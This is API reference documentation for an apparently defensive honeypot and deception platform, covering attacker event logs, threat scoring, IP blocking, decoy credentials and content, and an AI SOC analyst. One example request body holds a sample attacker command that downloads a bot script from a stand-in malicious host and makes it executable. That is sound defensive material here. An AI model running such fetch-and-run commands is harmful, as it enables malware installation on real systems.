# NeuroTrap CADN — API Reference

Base URL: `https://<host>/api`  
All responses are JSON. Authentication uses JWT Bearer tokens.

---

## Authentication

### POST `/api/auth/login`

Authenticate and receive a JWT token.

**Request body:**
```json
{
  "username": "admin",
  "password": "your-password",
  "otp": "123456"
}
```
> `otp` is required only when `MFA_ENABLED=1` is set in `.env`.

**Response:**
```json
{
  "token": "<jwt>",
  "role": "admin",
  "username": "admin",
  "mfa_required": false
}
```

**Error (401):**
```json
{ "error": "Invalid credentials" }
```

---

### GET `/api/auth/mfa/status`

Check whether MFA is enabled and configured on the server.

**Response:**
```json
{
  "mfa_enabled": true,
  "mfa_configured": true
}
```

---

### GET `/api/auth/otp/setup`

Generate a new TOTP secret and return the provisioning URI and QR code.  
Requires admin JWT.

**Response:**
```json
{
  "secret": "BASE32SECRET",
  "uri": "otpauth://totp/NeuroTrap:admin?secret=...",
  "qr_png_b64": "<base64-encoded PNG>"
}
```

---

### POST `/api/auth/otp/verify`

Pre-verify a TOTP code without logging in.

**Request body:**
```json
{ "otp": "123456" }
```

**Response:**
```json
{ "valid": true }
```

---

## Events

### GET `/api/events`

Return alert events with optional filtering and pagination.

**Query parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `limit` | int | 100 | Max events to return |
| `offset` | int | 0 | Skip N events (for pagination) |
| `attack_type` | string | — | Filter by attack type |
| `severity` | string | — | Filter by severity (low/medium/high/critical) |

**Response:**
```json
{
  "events": [
    {
      "event_id": "uuid",
      "src_ip": "192.168.1.1",
      "dst_ip": null,
      "dst_port": 22,
      "src_port": null,
      "attack_type": "brute_force",
      "severity": "high",
      "honeypot_source": "cowrie",
      "protocol": null,
      "username": "root",
      "password": "123456",
      "command": null,
      "session_id": "abc123",
      "timestamp": 1780969777.12,
      "extra": {}
    }
  ],
  "total": 33582,
  "limit": 100,
  "offset": 0
}
```

**Attack types:** `brute_force`, `command_injection`, `tool_fingerprint`, `protocol_anomaly`, `lateral_movement`, `malware_upload`, `port_scan`

---

### GET `/api/events/stats`

Return aggregated event statistics used by the dashboard KPIs.

**Response:**
```json
{
  "total_events": 33582,
  "active_sessions": 12,
  "blocked_ips": 12,
  "by_attack_type": [
    {
      "_id": "tool_fingerprint",
      "count": 18671,
      "avg_severity_score": 1.0
    }
  ]
}
```

> `blocked_ips` counts `response_log` entries with `action` in `["block_emergency", "isolate_alert"]`.

---

## Attackers

### GET `/api/attackers`

Return attacker profiles sorted by threat score.

**Query parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `limit` | int | 50 | Max profiles (max 200) |
| `sessions` | 0/1 | 0 | Include full session history |

**Response:**
```json
{
  "attackers": [
    {
      "src_ip": "192.109.200.220",
      "threat_score": 100.0,
      "attacker_tier": "automated_bot",
      "classified_intent": "bot_enrollment",
      "session_count": 798,
      "total_commands": 0,
      "first_seen": 1780000000.0,
      "last_seen": 1780969777.0,
      "country": "Netherlands",
      "ttps": [
        { "tactic": "Credential Access", "technique_id": "T1110", "confidence": 0.9 }
      ],
      "sessions": []
    }
  ]
}
```

---

### GET `/api/attackers/<src_ip>`

Return a single attacker profile with full session history.

**Response:** Same shape as one item from `/api/attackers`, always includes `sessions`.

**Error (404):**
```json
{ "error": "Not found" }
```

---

### POST `/api/profiles/recalculate`

Re-run `reclassify_intent()` and `_compute_threat_score()` for all profiles in MongoDB.  
Requires admin JWT.

**Response:**
```json
{ "updated": 45 }
```

---

## Response Engine

### POST `/api/response/block`

Manually block an IP via iptables.  
Requires admin JWT.

**Request body:**
```json
{ "src_ip": "1.2.3.4" }
```

**Response:**
```json
{ "status": "blocked", "src_ip": "1.2.3.4" }
```

---

### GET `/api/response/log`

Return the last 100 response actions.

**Response:**
```json
{
  "log": [
    {
      "action": "block_emergency",
      "src_ip": "192.109.200.220",
      "threat_score": 100.0,
      "timestamp": 1780969777.0,
      "details": { "intent": "bot_enrollment", "tier": "automated_bot" }
    }
  ]
}
```

**Action values:** `block_emergency`, `isolate_alert`, `slow_redirect`, `log_only`

---

## Environments

### GET `/api/environments`

Return all deception environments (active and expired).

**Response:**
```json
{
  "environments": [
    {
      "env_id": "env-uuid",
      "src_ip": "192.109.200.220",
      "attacker_tier": "automated_bot",
      "classified_intent": "bot_enrollment",
      "is_active": false,
      "created_at": 1780000000.0,
      "port": 12345,
      "credentials": { "username": "admin", "password": "fake123" }
    }
  ],
  "total": 16,
  "active_count": 0
}
```

---

## Honeypots

### GET `/api/honeypots`

Return sensor hit counts and recent attacker sessions.

**Response:**
```json
{
  "sensors": [
    { "port": 22, "protocol": "SSH", "hits": 33000, "status": "active" }
  ],
  "recent_sessions": [
    {
      "src_ip": "45.148.10.183",
      "session_id": "abc123",
      "commands": ["uname -a", "id"],
      "duration_secs": 14,
      "login_attempts": 5,
      "timestamp": 1780969777.0
    }
  ]
}
```

---

### GET `/api/honeypots/sessions/<src_ip>`

Return all sessions, events, credentials, and commands for one IP.

**Response:**
```json
{
  "src_ip": "45.148.10.183",
  "sessions": [ { "session_id": "...", "commands": [], "duration_secs": 14 } ],
  "events": [ { "attack_type": "brute_force", "timestamp": 1780969777.0 } ],
  "credentials": [ { "username": "root", "password": "123456" } ],
  "commands": ["uname -a", "id", "whoami"]
}
```

---

## Threat Intel

### GET `/api/intel`

Return the threat intelligence summary.

**Response:**
```json
{
  "total_events": 0,
  "top_countries": [
    { "country": "Netherlands", "count": 18572, "ip_count": 14 }
  ],
  "top_ports": [
    { "port": 22, "count": 28000 }
  ],
  "attack_type_dist": [
    { "type": "tool_fingerprint", "count": 18671 }
  ],
  "ioc_list": [
    { "src_ip": "192.109.200.220", "country": "NL", "threat_score": 100.0, "intent": "bot_enrollment" }
  ],
  "active_campaigns": [],
  "countries_seen": 22
}
```

---

## CBEE

### GET `/api/cbee/profiles`

Return cognitive bias profiles for all scored attackers.

**Response:**
```json
{
  "profiles": [
    {
      "src_ip": "192.109.200.220",
      "overall": 67.3,
      "dominant": "authority_bias",
      "dimensions": {
        "authority_bias": 82.1,
        "urgency_bias": 55.4,
        "social_proof": 41.0,
        "reciprocity": 38.2,
        "scarcity": 60.7
      },
      "updated_at": 1780969777.0
    }
  ]
}
```

---

### GET `/api/cbee/injections`

Return the bait injection log.

**Response:**
```json
{
  "injections": [
    {
      "src_ip": "192.109.200.220",
      "env_id": "env-uuid",
      "bias_type": "authority_bias",
      "bias_score": 82.1,
      "assets": [
        { "type": "fake_credential", "content": "admin:SuperSecret2024!" }
      ],
      "timestamp": 1780969777.0
    }
  ]
}
```

---

### POST `/api/cbee/score`

Score a session ad-hoc.  
Requires admin JWT.

**Request body:**
```json
{
  "commands": ["wget http://evil.com/bot.sh", "chmod +x bot.sh"],
  "duration_secs": 120,
  "login_attempts": 3,
  "classified_intent": "malware_deployment"
}
```

**Response:** Full `BiasProfile` object (same shape as one item in `/api/cbee/profiles`).

---

## GADCF

### GET `/api/gadcf/assets`

Return recently generated deception content assets.

**Response:**
```json
{
  "assets": [
    {
      "asset_type": "env_file",
      "content": "DB_PASSWORD=SuperSecret\nAWS_KEY=AKIA...",
      "target_ip": "192.109.200.220",
      "created_at": 1780969777.0
    }
  ]
}
```

**Asset types:** `env_file`, `email_thread`, `code_repo`, `wiki_page`, `db_dump`

---

### POST `/api/gadcf/generate`

Trigger content generation for a target IP.  
Requires admin JWT.

**Request body:**
```json
{ "src_ip": "192.109.200.220", "asset_type": "env_file" }
```

**Response:**
```json
{ "generated": 1, "asset_type": "env_file" }
```

---

## FHIM

### GET `/api/fhim/nodes`

Return federated learning node status.

**Response:**
```json
{
  "nodes": [
    { "node_id": "node-1", "status": "active", "last_seen": 1780969777.0, "f1_score": 0.87 }
  ],
  "global_f1": 0.86
}
```

---

### GET `/api/fhim/rounds`

Return aggregation round history.

**Response:**
```json
{
  "rounds": [
    { "round": 1, "participants": 3, "global_f1": 0.84, "timestamp": 1780000000.0 }
  ]
}
```

---

## Digital Twin

### GET `/api/twin/list`

Return all attacker digital twins.

**Response:**
```json
{
  "twins": [
    {
      "src_ip": "192.109.200.220",
      "attacker_tier": "automated_bot",
      "kill_chain_stage": "actions_on_objectives",
      "predicted_next": ["exfiltrate_data", "install_persistence"],
      "confidence": 0.78,
      "built_at": 1780969777.0
    }
  ]
}
```

---

### GET `/api/twin/<src_ip>`

Return one digital twin in full detail.

---

### POST `/api/twin/build`

Build or refresh digital twin(s).  
Requires admin JWT.

**Request body:**
```json
{ "src_ip": "192.109.200.220" }
```
> Omit `src_ip` to rebuild all.

---

### POST `/api/twin/simulate`

Run a forward simulation of an attacker's next N moves.  
Requires admin JWT.

**Request body:**
```json
{ "src_ip": "192.109.200.220", "steps": 5 }
```

**Response:**
```json
{
  "src_ip": "192.109.200.220",
  "simulation": [
    { "step": 1, "action": "credential_dump", "probability": 0.72 },
    { "step": 2, "action": "lateral_movement", "probability": 0.55 }
  ]
}
```

---

## SOC Analyst

### GET `/api/soc/summary`

Return the AI-generated SOC shift summary.

**Response:**
```json
{
  "summary": "During this shift, 3 CRITICAL attackers were detected...",
  "generated_at": 1780969777.0
}
```

---

### GET `/api/soc/triage`

Return ranked action queue.

**Response:**
```json
{
  "queue": [
    {
      "src_ip": "192.109.200.220",
      "priority": 1,
      "recommended_action": "block",
      "reason": "798 sessions, cryptomining tools detected"
    }
  ]
}
```

---

### GET `/api/soc/reports`

Return recent SOC incident reports.

---

### POST `/api/soc/report`

Generate a detailed incident report for one IP.  
Requires admin JWT.

**Request body:**
```json
{ "src_ip": "192.109.200.220" }
```

---

### POST `/api/soc/chat`

Ask the AI SOC analyst a question.  
Requires admin JWT.

**Request body:**
```json
{ "message": "What is 192.109.200.220 trying to do?" }
```

**Response:**
```json
{ "reply": "Based on 798 sessions and bot_enrollment classification, this IP is..." }
```

---

## Error Responses

All endpoints return standard error shapes:

| Code | Body | Meaning |
|------|------|---------|
| 400 | `{ "error": "..." }` | Bad request / missing field |
| 401 | `{ "error": "Unauthorized" }` | Missing or invalid JWT |
| 403 | `{ "error": "Forbidden" }` | Valid JWT but insufficient role |
| 404 | `{ "error": "Not found" }` | Resource doesn't exist |
| 500 | `{ "error": "Internal error" }` | Server-side failure |

---

## Caching

Most `GET` endpoints are cached in memory for 30 seconds using the `@cached()` decorator in `app.py`. Cache keys are query-string-aware. To force a refresh, either wait 30 seconds or restart the API container:

```bash
docker compose restart api
docker compose exec nginx nginx -s reload
```
